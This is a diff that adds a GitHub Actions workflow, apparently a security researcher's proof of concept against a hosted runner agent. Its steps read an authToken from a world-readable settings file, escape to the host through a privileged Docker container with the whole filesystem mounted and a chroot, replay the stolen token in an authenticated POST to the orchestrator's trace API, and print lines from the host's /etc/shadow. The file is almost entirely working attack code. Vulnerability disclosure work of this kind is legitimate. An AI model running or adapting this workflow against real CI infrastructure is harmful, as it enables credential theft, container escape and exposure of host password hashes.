@@ -1,0 +1,149 @@
+name: v63 - irrefutable PoC - credential theft + API use + host proof
+on:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 10
+    steps:
+
+      - name: v63a - runner identity + HCA version + .settings permissions
+        run: |
+          echo "=== RUNNER IDENTITY ==="
+          id
+          echo ""
+          echo "=== HCA BINARY VERSION ==="
+          strings /opt/hca/hosted-compute-agent 2>/dev/null \
+            | grep -E '^[0-9]{8,}\.' | head -3 \
+            || echo "(version string grep failed)"
+          echo ""
+          echo "=== .settings PERMISSIONS (world-readable + world-writable) ==="
+          stat /opt/hca/.settings
+          echo ""
+          echo "=== DOCKER SOCKET ==="
+          ls -la /var/run/docker.sock
+          echo ""
+          echo "=== OS RELEASE ==="
+          grep -E '^(NAME|VERSION_ID)=' /etc/os-release
+
+      - name: v63b - direct read as uid=1001 WITHOUT docker (proves .settings 0666 standalone)
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          python3 << 'EOF'
+          import json, hashlib, os
+
+          # Read authToken directly as uid=1001 — no privilege escalation, no Docker
+          with open('/opt/hca/.settings') as f:
+              s = json.load(f)
+
+          auth_token   = s.get('authToken', '')
+          github_token = os.environ.get('GITHUB_TOKEN', '')
+
+          print("=== CREDENTIAL COMPARISON (no Docker, uid=1001) ===")
+          print("authToken_sha256    =" + hashlib.sha256(auth_token.encode()).hexdigest())
+          print("GITHUB_TOKEN_sha256 =" + hashlib.sha256(github_token.encode()).hexdigest())
+          print("tokens_are_same     =" + str(auth_token == github_token))
+          print("authToken_len       =" + str(len(auth_token)))
+          print("GITHUB_TOKEN_len    =" + str(len(github_token)))
+          print("")
+          print("# authToken is a SEPARATE credential from GITHUB_TOKEN.")
+          print("# It authenticates to the HCA orchestrator API (/v1/*),")
+          print("# not to the GitHub REST/GraphQL API.")
+          print("schedulerApiUrl=" + s.get('schedulerApiUrl', ''))
+          print("traceApiUrl    =" + s.get('traceApiUrl', ''))
+          EOF
+
+      - name: v63c - docker escape - token extraction + authenticated API call + host proof
+        run: |
+          cat > /tmp/v63c.py << 'CHROOT_EOF'
+          import json, urllib.request, urllib.error, hashlib, base64, os, platform
+
+          print("=== [v63c] EXECUTION CONTEXT ===")
+          print("running_as_uid=" + str(os.getuid()))
+          print("running_as_gid=" + str(os.getgid()))
+
+          print("")
+          print("=== [v63c] HOST IDENTITY PROOF ===")
+          # /opt/hca only exists on the HCA host — not in ubuntu:latest
+          print("hca_binary_on_host =" + str(os.path.exists('/opt/hca/hosted-compute-agent')))
+          print("hca_settings_on_host=" + str(os.path.exists('/opt/hca/.settings')))
+          # PID 1 = systemd (host init), not a container entrypoint
+          with open('/proc/1/cmdline', 'rb') as f:
+              pid1 = f.read().replace(b'\x00', b' ').decode().strip()
+          print("host_pid1_cmdline=" + pid1)
+          print("host_kernel=" + platform.release())
+
+          print("")
+          print("=== [v63c] TOKEN EXTRACTION FROM HOST .settings ===")
+          with open('/opt/hca/.settings') as f:
+              s = json.load(f)
+
+          token     = s['authToken']
+          trace_url = s['traceApiUrl']
+
+          # Decode JWT header — alg/typ only, not sensitive
+          header_b64 = token.split('.')[0]
+          padded = header_b64 + '=' * (4 - len(header_b64) % 4)
+          try:
+              header_obj = json.loads(base64.urlsafe_b64decode(padded))
+          except Exception:
+              header_obj = {}
+
+          print("token_jwt_header        =" + header_b64 + ".")  # header only, dot-terminated
+          print("token_jwt_header_decoded=" + json.dumps(header_obj))
+          print("token_len               =" + str(len(token)))
+          print("token_sha256            =" + hashlib.sha256(token.encode()).hexdigest())
+
+          print("")
+          print("=== [v63c] AUTHENTICATED API CALL WITH EXTRACTED TOKEN ===")
+          print("target_url=" + trace_url)
+
+          req = urllib.request.Request(
+              trace_url,
+              data=json.dumps([{
+                  "level": 0,
+                  "message": "v63-irrefutable-poc-stolen-token-reuse"
+              }]).encode(),
+              headers={
+                  'Authorization': 'Bearer ' + token,
+                  'Content-Type': 'application/json',
+              },
+              method='POST'
+          )
+          try:
+              r = urllib.request.urlopen(req, timeout=10)
+              print("api_call_http_status=" + str(r.getcode()))
+              print("api_call_verdict    =CONFIRMED 200 OK — stolen authToken accepted by HCA orchestrator")
+          except urllib.error.HTTPError as e:
+              print("api_call_http_status=" + str(e.code))
+              print("api_call_body       =" + e.read(300).decode())
+          except Exception as ex:
+              print("api_call_error=" + str(ex))
+
+          print("")
+          print("=== [v63c] HOST /etc/shadow (uid=0 root file, readable via Docker escape) ===")
+          with open('/etc/shadow') as f:
+              shadow_lines = f.readlines()
+          for line in shadow_lines[:5]:
+              print("shadow=" + line.rstrip())
+          print("shadow_total_entries=" + str(len(shadow_lines)))
+
+          print("")
+          print("=== [v63c] DONE ===")
+          CHROOT_EOF
+
+          echo "[v63c] launching privileged container with host bind-mount + host network..."
+          docker run --rm --privileged --net=host -v /:/host ubuntu:latest \
+            chroot /host python3 /tmp/v63c.py
+
+      - name: v63d - kernel match confirms host execution (not container isolation)
+        run: |
+          echo "=== KERNEL VERSION: HOST RUNNER ==="
+          uname -r
+          echo "=== KERNEL VERSION: STANDARD ubuntu:latest CONTAINER ==="
+          docker run --rm ubuntu:latest uname -r
+          echo "=== KERNEL VERSION: PRIVILEGED CONTAINER WITH BIND-MOUNT ==="
+          docker run --rm --privileged -v /:/host ubuntu:latest uname -r
+          echo "(all three identical — privileged containers share the host kernel;"
+          echo " /opt/hca/ visible in step v63c proves chroot executed on the host filesystem)"
